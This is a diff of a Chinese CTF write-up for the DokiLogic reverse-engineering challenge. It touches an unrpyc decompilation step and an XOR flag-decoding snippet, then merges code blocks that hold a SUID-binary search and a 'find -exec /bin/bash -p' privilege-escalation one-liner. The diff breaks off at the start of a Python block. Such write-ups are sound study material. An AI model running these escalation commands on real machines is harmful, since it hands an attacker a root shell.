@@ -35,7 +35,8 @@ DokiLogic
 
 但是!我没有解密这个文件的脚本 /(ㄒoㄒ)/~~ ,以下来自赛后复现….
 
-用unrpyc解密rpyc:https://github.com/CensoredUsername/unrpyc
+用unrpyc解密rpyc:
+https://github.com/CensoredUsername/unrpyc
 
 拿到script.rpy
 
@@ -67,22 +68,13 @@ os.remove('temp.exe')
 flag_input = "".join(chr(ord(c) ^ 35) for c in output)
 print(f'flag{{{flag_input}}}')
 
-最后的最后,公众号后台回复:CCB2026拿题目附件(RE/AI)
+最后的最后,公众号后台回复:
+CCB2026拿题目附件(RE/AI)
 
 
 ```
 find / -perm -4000 -type f -exec ls -la {} 2>/dev/null ;
-```
-
-
-
-```
 /usr/bin/find . -exec /bin/bash -p ; -quit
-```
-
-
-
-```
 import subprocess
 import os
 
